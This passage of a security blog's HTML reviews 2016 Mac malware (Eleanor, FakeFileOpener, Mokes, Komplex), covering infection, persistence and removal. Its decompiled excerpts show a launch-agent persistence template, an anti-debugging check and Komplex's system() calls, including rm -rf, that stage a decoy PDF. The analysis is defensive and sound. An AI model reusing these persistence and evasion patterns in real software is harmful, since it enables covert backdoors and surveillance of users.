		<span><img src="../images/blog/blog_0x16/eleanorPHPTerminal.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	<br>
		<span><img src="../images/blog/blog_0x16/eleanorPHPEval.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	To further extend the features, or capabilities of the malware, it 'ships' with several utilities such as netcat and wacaw. The latter, wacaw, is available <a class="inlineLink" href="http://webcam-tools.sourceforge.net/">online</a> where it is described as <i>"a little command-line tool for Mac OS X that allows you to capture both still pictures and video from an attached camera"</i>. Thus an attacker could record the user of an infected Mac.
	<br>
	<br>
	<b>&rsaquo;</b> disinfection
	<br>
	To remove OSX/Eleanor from a system, simply unload then delete the three aforementioned launch agents. Following this, delete the 'hidden' <span class="n3rdFont">~/Library/.dropbox</span> directory and the malicious EasyDoc Convertor application. 
	<br>
	<br>
	Apple has also updated XProtect with a signature to block Eleanor:

	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat /System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist<br>
	&lt;key&gt;Description&lt;/key&gt;<br>
	&lt;string&gt;OSX.Eleanor.A&lt;/string&gt;<br>
	&lt;key&gt;LaunchServices&lt;/key&gt;<br>
	&lt;dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;key&gt;LSItemContentType&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&lt;string&gt;com.apple.application-bundle&lt;/string&gt;<br>
	&lt;/dict&gt;<br>
	&lt;key&gt;Matches&lt;/key&gt;<br>
	&lt;array&gt;<br>
    &nbsp;&nbsp;&nbsp;&lt;dict&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;MatchType&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;MatchAny&lt;/string&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;Matches&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;array&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;MatchFile&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;NSURLTypeIdentifierKey&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;public.unix-executable&lt;/string&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;MatchType&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;Match&lt;/string&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;Identity&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;data&gt;3mQnUelrjFN0TwMab36SnVMiYyE=&lt;/data&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;MatchFile&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;key&gt;NSURLTypeIdentifierKey&lt;/key&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;public.unix-executable&lt;/string&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/dict&gt;<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...
    <br>
    <br>
	</span>
	</div>

	<br>
	<br>
	<span style="color: #95c02d; font-weight: bold;">Fake File Opener</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x16/fakeFileOpener.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 8px;">
	  Fake File Opener
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found on:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">8/2016</td>
	</tr>
	<tr style="border:none;">
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found by:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">MalwareBytes (<a class="inlineLink" href="https://blog.malwarebytes.com/threat-analysis/2016/08/pcvark-plays-dirty/">report</a>)
	  </td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection vector:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">fake ('security') popup</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">adware, adware installer</td>
	</tr>
	<tr>
	  <td style="border:none;"><b>disinfection:</b></td>
	  <td style="border:none;">delete application</td>
	</tr>
	</tbody>
	</table>
	OSX/FakeFileOpener is a rather silly piece of adware, though it does have a unique persistence mechanism.
	<br>
  	<br>
  	<b>&rsaquo;</b> infection vector
  	<br>
  	OSX/FakeFileOpener is installed along with other annoying OS X adware when a user is tricked into believing a fake security alert originating from 'AdvancedMacCleaner.com' 
  	<br><br>
		<span><img src="../images/blog/blog_0x16/fakeFileOpenerInfection.png" width="500" style="display:block; margin:auto;"/></span>
	<br>
	If the user clicks 'Install Security Upgrade Now' button and executes the downloaded adware installer package, they will infect themselves. As the OSX/FakeFileOpener adware application, 'Mac File Opener.app' was signed, Gatekeeper (in its default settings) would allow it to execute:
	<br><br>
		<span><img src="../images/blog/blog_0x16/fakeFileOpenerSigned.png" width="700" style="display:block; margin:auto;"/></span>
	<br>
	<b>&rsaquo;</b> persistence
	<br>
    Thomas Reed (@thomasareed), the malware reverser who originally analyzed the sample noted that, <i>"even more intriguing, this app didn't have any apparent mechanism for being launched. It hadn't been added to my login items. There wasn't a new launch agent or daemon designed to load it. It simply seemed to be sitting there, doing nothing."</i>
    <br> 
    <br>
	Digging deeper, he discovered that this malicious application (by means of its <span class="n3rdFont">Info.plist</span> file) registers itself as the 'document handler' for a myriad of file types. In his words: 
	<br><br>
	<i>"Essentially, what this app had done is set itself up as an app that can open most files that are at all likely to be on the typical user's system. Worse, if there is no other app to open a specific file, this app would be the default. It turns out that this is exactly what that app wants, and it takes full advantage of that fact."</i>
	<br><br>
		<span><img src="../images/blog/blog_0x16/fakeFileOpenerDocHandlers.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	Since this mechanism requires a user launch an application that previously didn't have a default 'document handler' and matches one that 'Mac File Opener' registered for, this is somewhat of a 'unreliable' persistence mechanism. However, the upside to this method is that it will 'bypass' tools such as <a class="inlineLink" href="https://objective-see.com/products/blockblock.html">BlockBlock</a> that monitor for true persistence mechanisms (i.e. ones that require no user interaction, instead are automatically executed each time the system is rebooted or the user logs in).
	<br>
	<br>
	It's rare to find novel persistence mechanisms in OS X malware. As such, I previously dedicated an entire blog post, titled, <a class="inlineLink" href="https://objective-see.com/blog/blog_0x12.html">"Click File, App Opens"</a> that digs into the technical details of this persistence and how, at the OS level, such document handlers work.
	<br>
	<br>
	<b>&rsaquo;</b> features
	<br>
	OSX/FakeFileOpenor is part of a fairly standard run-of-the-mill OS X adware package. It appears that its goal is simply to get the user to install more adware. Specifically, whenever the <span class="n3rdFont">Mac File Opener.app</span> is launched (when the user tries to open any file it has registered a document handler for), it will display a popup with a 'Search Web' button. If the user clicks this button, it will load www.macfileopener.org in a browser window.
	<br><br>
		<span><img src="../images/blog/blog_0x16/fakeFileOpenerPopup.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 13px;">
	<span class="n3rdFont">
	void -[AppDelegate searchWeb:]<br>
	{<br>
    &nbsp;&nbsp;var_80 = [[@"Adva" stringByAppendingString:@"nced Ma"] stringByAppendingString:@"c Cleaner"];<br>
    &nbsp;&nbsp;var_88 = [[@"Mac A" stringByAppendingString:@"dware C"] stringByAppendingString:@"leaner"];<br>
    &nbsp;&nbsp;var_90 = [[@"Mac Sp" stringByAppendingString:@"ace Re"] stringByAppendingString:@"viver"];<br>
    &nbsp;&nbsp;var_98 = [[@"Disk R" stringByAppendingString:@"evi"] stringByAppendingString:@"ver"];<br>
    &nbsp;&nbsp;var_A0 = [[@"Disk Cl" stringByAppendingString:@"eanu"] stringByAppendingString:@"p Pro"];<br>
    &nbsp;&nbsp;....<br>
    <br>
    &nbsp;&nbsp;[[NSWorkspace sharedWorkspace] openURL:[NSURL URLWithString:[NSString stringWithFormat:@"http://macfileopener.com/     ext/%@/?amc=%@&amp;madc=%@&amp;msr=%@&amp;drv=%@&amp;dcp=%@", [var_30 extension], var_58, var_60, var_68, var_70, var_78]]];
	</span>
	</div>
	<br>
	This website will often display other adware-related popups and alerts to trick the user into downloading and installing even more malware. As Thomas Reed notes; <i>"these pages will download other junk PCVARK apps, such as Mac Adware Remover or Mac Space Reviver."</i>
	<br><br>
		<span><img src="../images/blog/blog_0x16/fakeFileOpenerAdware.png" width="600" style="display:block; margin:auto;"/></span>
	<br>
	<br>
	<b>&rsaquo;</b> disinfection
	<br>
	To remove OSX/FakeFileOpenor, simply delete the Mac File Opener application. Behind the scenes this will cause the OS to also unregister its document handlers: 
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	# fs_usage -w -f filesystem | grep csstore<br>
	<br>
	rename          com.apple.LaunchServices-134501.csstore~   lsd.31116<br>
	open            com.apple.LaunchServices-134501.csstore    lsd.31116<br>
	WrData[AT2]     com.apple.LaunchServices-134501.csstore    lsd.31116<br>
	WrData[AT2]     com.apple.LaunchServices-134501.csstore    lsd.31116<br>
    <br>
    <br>
    $ /System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework<br>/Support/lsregister -dump | grep "Mac File Opener" | wc<br>
    <br>
	0&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;0
	<br>
	</span>
	</div>
	<br>
	<br>
	<span style="color: #95c02d; font-weight: bold;">Mokes</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x16/mokes.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 12px;">
	  Mokes
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found on:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">9/2016</td>
	</tr>
	<tr style="border:none;">
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found by:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">Kaspersky (<a class="inlineLink" href="https://securelist.com/blog/research/75990/the-missing-piece-sophisticated-os-x-backdoor-discovered/">report</a>)
	  </td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection vector:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">unknown</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">backdoor, with logic to capture; screen shots, audio, video, &amp; keystrokes.</td>
	</tr>
	<tr>
	  <td style="border:none;"><b>disinfection:</b></td>
	  <td style="border:none;">delete launch agent</td>
	</tr>
	</tbody>
	</table>
  	While OSX/Mokes does support a wide range of features, at its core, it's still a fairly standard OS X backdoor.
  	<br>
  	<br>
  	<b>&rsaquo;</b> infection vector
  	<br>
  	How user are become infected by OSX/Mokes is still unknown. Kaspersky, the AV company that discovered it, stated, <i>"...we can only speculate how this malware makes it to the victim machine. All vectors are possible: exploits, installation via another previously installed malware and of course via social engineering."</i>
  	<br>
  	<br>
  	<b>&rsaquo;</b> persistence
  	<br>
  	Launch Agents are the preferred method of persistence for OS X malware. OSX/Mokes conforms to this trend installing itself launch agent via the <span class="n3rdFont">storeuserd.plist</span> in <span class="n3rdFont">~/Library/LaunchAgents/</span>. Looking at its disassembly, its easy to find the embedded template the malware uses for the launch agent:
  	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	EkomsAutorun::service(void)::launchdContextTemplate<br>
	db '&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;',0Ah<br>
	db '&lt;plist version=&quot;1.0&quot;&gt;',0Ah<br>
	db '&lt;dict&gt;',0Ah<br>
	db 9,'&lt;key&gt;Label&lt;/key&gt;',0Ah<br>
	db 9,'&lt;string&gt;%1&lt;/string&gt;',0Ah<br>
	db 9,'&lt;key&gt;ProgramArguments&lt;/key&gt;',0Ah<br>
	db 9,'&lt;array&gt;',0Ah<br>
	db 9,9,'&lt;string&gt;%2&lt;/string&gt;',0Ah<br>
	db 9,'&lt;/array&gt;',0Ah<br>
	db 9,'&lt;key&gt;RunAtLoad&lt;/key&gt;',0Ah<br>
	db 9,'&lt;true/&gt;',0Ah<br>
	db 9,'&lt;key&gt;KeepAlive&lt;/key&gt;',0Ah<br>
	db 9,'&lt;true/&gt;',0Ah<br>
	db '&lt;/dict&gt;',0Ah<br>
	db '&lt;/plist&gt;',0Ah,0<br>
	</span>
	</div>
	<br><br>
		<span><img src="../images/blog/blog_0x16/mokesPlist.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	<br>
  	<b>&rsaquo;</b> features
  	<br>
	Besides basic features such as download and execute, OSX/Mokes supports a fairly wide range of other capabilities as noted by Kaspersky:  <i>"This malware...is able to steal various types of data from the victim’s machine (Screenshots, Audio-/Video-Captures, Office-Documents, Keystrokes)."</i> One can confirm this by reversing the malware's binary. For example, below are several hard-coded file search constants:
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	0000001C unicode :/file-search<br>
	0000000E unicode *.xlsx<br>
	0000000C unicode *.xls<br>   
	0000000E unicode *.docx<br>    
	0000000C unicode *.doc<br>
	</span>
	</div>
	<br>
	The malware also monitors for removable media (e.g. USB sticks). To record the user, the malware utilizes the QT. This cross-platform framework contains OS X-specific webcams recording code:
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	<span style="color: #006600;">//embedded QT methods</span><br>
	AVFMediaRecorderControl::AVFMediaRecorderControl(AVFCameraService *,QObject *)<br>
	AVFMediaRecorderControl::setState(QMediaRecorder::State)<br>
	AVFMediaRecorderControl::setupSessionForCapture(void)<br>
	<br>
	<br>
	<span style="color: #006600;">//disassembly of 'setupSessionForCapture' method</span><br>
	AVFMediaRecorderControl::setupSessionForCapture(void) proc<br>
 	&nbsp;...
 	<br>
 	&nbsp;call    AVFCameraSession::state(void)<br>
 	<br>
 	&nbsp;call    AVFAudioInputSelectorControl::createCaptureDevice(void)<br>
 	<br>
 	&nbsp;lea     rdx, "Could not connect the video recorder"<br>
 	&nbsp;...<br>
 	&nbsp; call    QMediaRecorderControl::error(int,QString const&amp;)
 	<br>
	</span>
	</div>
	<br>
	<br>
  	<b>&rsaquo;</b> disinfection
  	<br>
  	Removing OSX/Mokes is a touch complex, as the malware may install itself into multiple locations. Once the malware is detected though, simply unload its launch agent (e.g. <span class="n3rdFont">launchctl unload ~/Library/LaunchAgents/storeuserd.plist</span>) then delete its binary (e.g. <span class="n3rdFont">storeuserd</span>). 
  	<br>
  	<br>
	Besides the standard <span class="n3rdFont">storeuserd</span> name, the malware may install itself to:
	<ul style="list-style-type:square">
	<span class="n3rdFont">
	<li>~/Library/com.apple.spotlight/SpotlightHelper</li>
	<li>~/Library/Dock/com.apple.dock.cache</li>
	<li>~/Library/Skype/SkypeHelper</li>
	<li>~/Library/Dropbox/DropboxCache</li>
	<li>~/Library/Google/Chrome/nacld</li>
	<li>~/Library/Firefox/Profiles/profiled</li>
	</ul>
	<br>
	<br>
	<span style="color: #95c02d; font-weight: bold;"><a id="Komplex"></a>Komplex</span><br>
	<table>
	<thead>
	<tr style="border:none;">
	  <th colspan="2" style="border: none; padding: 0px; padding-left: 5px;">
	  <img src="../images/blog/blog_0x16/komplex.png" width="32" style="padding-top: 10px;"/> 
	  <span style="display: inline-block; vertical-align: top; padding-top: 5px;">
	  Komplex
	  </span>
	  </th>
	</tr>
	</thead>
	<tbody>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found on:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">9/2016</td>
	</tr>
	<tr style="border:none;">
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>found by:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">PaloAlto Networks (<a class="inlineLink" href="http://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/">report</a>)
	  </td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>infection vector:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">email</td>
	</tr>
	<tr>
	  <td style="border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;"><b>features:</b></td>
	  <td style="border:none; border-bottom: 1px; border-bottom-style: solid; border-color: #b3b3b3;">backdoor, with standard features</td>
	</tr>
	<tr>
	  <td style="border:none;"><b>disinfection:</b></td>
	  <td style="border:none;">delete launch agent</td>
	</tr>
	</tbody>
	</table>
  	Russian cyber-operations were a popular topic in 2016. OSX/Komplex is one of the Russian's (APT 28/Fancy Bear's) OS X implants. 
  	<br>
  	<br>
  	<b>&rsaquo;</b> infection vector
  	<br>
  	OSX/Komplex is a Mac application that is distributed via email (as an attachment). When executed, it will infect the system, but also display an PDF document in a (lame) attempt to hide the infection. The antivirus company Intego, notes that:
  	<br> 
   	<br>
  	"<i>The person who receives the email may think they are opening a PDF file with future plans for the Russian aerospace program, but in fact, it is a Trojan that will install files on the system and connect to a remote command &amp; control (c&amp;c) server.</i>"</span>
  	<br><br>
		<span><img src="../images/blog/blog_0x16/komplexInfection.png" width="800" style="display:block; margin:auto;"/></span>
	<br>
	Looking at the disassembly of the malware's <span class="n3rdFont">main</span> function shows the malware opening the embedded PDF, via the Preview application:
	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 12px;">
	<span class="n3rdFont">
	int main(int arg0, int arg1)<br>
	{ <br>
  	&nbsp;&nbsp;var_38 = [NSSearchPathForDirectoriesInDomains(0xf, 0x1, 0x1) objectAtIndex:0x0];<br>
  	&nbsp;&nbsp;var_48 = [NSString stringWithFormat:@"SetFile -a E %@/roskosmos_2015-2025.pdf", var_38];<br>
  	&nbsp;&nbsp;var_50 = [NSString stringWithFormat:@"rm -rf %@/roskosmos_2015-2025.app", var_38];<br>
  	&nbsp;&nbsp;var_58 = [NSString stringWithFormat:@"open -a Preview.app %@/roskosmos_2015-2025.pdf", var_38];<br>
     <br><br>
	&nbsp;&nbsp;system([var_50 UTF8String]);<br>
	&nbsp;&nbsp;system([var_48 UTF8String]);<br>
	&nbsp;&nbsp;system([var_58 UTF8String]);<br>
 	<br>
	</span>
	</div>
	<br>
  	<br>
  	<b>&rsaquo;</b> persistence
  	<br>
	How does this malware persist? If you guessed launch agent, you are right! OSX/Komplex persists via <span class="n3rdFont">~/Library/LaunchAgents/com.apple.updates.plist</span>. This persistent launch agent plist, points to a malware's binary which is located in <span class="n3rdFont">/Users/Shared/.local/kextd</span>.
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ cat ~/Library/LaunchAgents/com.apple.updates.plist<br>
	&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;<br>
	&lt;plist version=&quot;1.0&quot;&gt;<br>
	&lt;dict&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;key&gt;Label&lt;/key&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;string&gt;com.apple.updates&lt;/string&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;key&gt;ProgramArguments&lt;/key&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;array&gt;<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;string&gt;/Users/Shared/.local/kextd&lt;/string&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;/array&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;key&gt;RunAtLoad&lt;/key&gt;<br>
   	&nbsp;&nbsp;&nbsp;&lt;true/&gt;<br>
   	...
    <br>
	</span>
	</div> 
	<br>
  	<br>
  	<b>&rsaquo;</b> features
  	<br>
  	When executed, OSX/Komplex first checks if it is being debugged or executed on a system that is not connected to the internet:
  	<div style="border: 1px solid gray; padding: 10px; margin-top:10px; font-size: 14px;">
	<span class="n3rdFont">
	int main(int argc, char* argv[])<br> 
	{<br>
   	<br>
    &nbsp;&nbsp;&nbsp;if ((AmIBeingDebugged() &amp; 0x1) == 0x0)<br>
    &nbsp;&nbsp;&nbsp;{<br>
    &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while ((connectedToInternet() &amp; 0x1 &amp; 0x1) == 0x0)<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleep(0x3c);<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax = sub_100005b40();<br>
    &nbsp;&nbsp;&nbsp;}<br>
    &nbsp;&nbsp;&nbsp;else <br>
    &nbsp;&nbsp;&nbsp;{<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;remove(*argv);<br>
	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax = 0x0;<br>
    &nbsp;&nbsp;&nbsp;}<br>
    <br>
    &nbsp;&nbsp;&nbsp;return rax;<br>
	}
 	<br>
	</span>
	</div>
	<br>
	OSX/Komplex implements only few basic features. However, these are sufficient to allow a remote attacker to completely control an infected host. These features include:
	<ul style="list-style-type:square">
	<li>download a file</li>
	<li>delete a file</li>
	<li>configure the backdoor</li>
	<li>executing a file</li>
	<li>executing a shell command</li>
	</ul>
	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ nm Komplex | c++filt -p -i | grep File<br>
	0000000100001e60 T FileExplorer::executeFile(char const*, unsigned long)<br>
	0000000100001b90 T FileExplorer::getFileName()<br>
	0000000100001b70 T FileExplorer::setFileName(char*)<br>
	0000000100001e00 T FileExplorer::setParameters(char*)<br>
	0000000100001bd0 T FileExplorer::executeShellCommand()<br>
	0000000100001e20 T FileExplorer::setRemove()<br>
	</span>
	</div>
	<br>
	Besides the Russia connection, OSX/Komplex is rather interesting as the PaloAlto researchers note it may have actually been spotted before. In 2015, BAE systems released a report title <a class="inlineLink" href="http://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html">"New Mac OS Malware Exploits Mackeeper."</a> In this report they describe a new (unnamed) piece of malware that exploited a remote vulnerability in the infamous MacKeeper software in order to infect Mac users. The PaloAlto researchers noted a lot of similar code, leading them to state, "<i>these overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.</i>"
	<br>
  	<br>
  	<b>&rsaquo;</b> disinfection
  	<br>
  	It is trivial to remove OSX/Komplex. First simply unload the malware's launch agent (<span class="n3rdFont">~/Library/LaunchAgents/com.apple.updates.plist</span>). Then delete both the launch agent plist and binary:
  	<div style="padding: 10px; margin-top:10px; background-color:black; color:lime; font-size: 14px;">
	<span class="n3rdFont">
	$ launchctl unload ~/Library/LaunchAgents/com.apple.updates.plist<br>
	<br>
	$ rm ~/Library/LaunchAgents/com.apple.updates.plist<br>
	<br>
	$ rm /Users/Shared/.local/kextd<br>
	</span>
	</div>
	<br>
	<br>
	<span style="color: #95c02d; font-weight: bold;">Conclusion</span><br>
	Well that's a wrap! In this blog we discussed (all?) Mac malware that emerged in 2016. Hopefully 2017 will bring us lots of new malware to play with :)
	<br>
	<br>
	<br>
	</section>	
</div>	

<!-- footer, copyright notice and social media icons -->
<nav role="footer">
<ul>
	<li class="copyright">&copy; 2017 objective-see llc</li>
	<li><a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon ss-social">&#x2709;</span></a></li>
	<li><a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon ss-social">&#xF611;</span></a></li>
	<li><a href="../rss.xml" class="menubutton icon"><span class="ss-icon">&#xE310;</span></a></li>
	<li>
        <a href="https://www.patreon.com/bePatron?u=4857001" class="menubutton icon donate" style="font-size: 18px; padding-top: 14px;">donate!</a>
    </li>
</ul>
</nav>

</body>
</html>
